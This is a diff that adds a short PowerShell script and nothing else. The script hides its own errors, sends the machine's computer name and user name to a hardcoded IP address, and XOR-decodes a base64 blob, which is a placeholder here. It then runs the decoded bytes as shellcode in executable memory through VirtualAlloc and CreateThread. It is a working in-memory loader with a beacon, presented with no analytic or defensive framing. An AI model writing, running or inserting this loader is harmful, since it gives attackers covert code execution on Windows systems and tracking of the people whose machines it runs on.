@@ -1,0 +1,17 @@
+$ErrorActionPreference='SilentlyContinue'
+try{$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0');$w.DownloadString('http://104.234.26.225:8090/ping?h=PS-'+$env:COMPUTERNAME+'-'+$env:USERNAME)|Out-Null}catch{}
+$k=[byte[]](156,144,102,193,24,188,28,91,236,128,206,205,2,146,72,220,224,98,104,20,207,77,137,251,216,106,177,53,74,174,229,74)
+$b=[Convert]::FromBase64String('{BLOB}')
+for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i % $k.Length]}
+Add-Type -TypeDefinition @"
+using System;using System.Runtime.InteropServices;
+public class N{
+ [DllImport(""kernel32"")] public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
+ [DllImport(""kernel32"")] public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr i);
+ [DllImport(""kernel32"")] public static extern uint WaitForSingleObject(IntPtr h,uint m);
+}
+"@
+$p=[N]::VirtualAlloc(0,$b.Length,0x3000,0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length)
+$t=[N]::CreateThread(0,0,$p,0,0,0)
+[N]::WaitForSingleObject($t,0xFFFFFFFF)
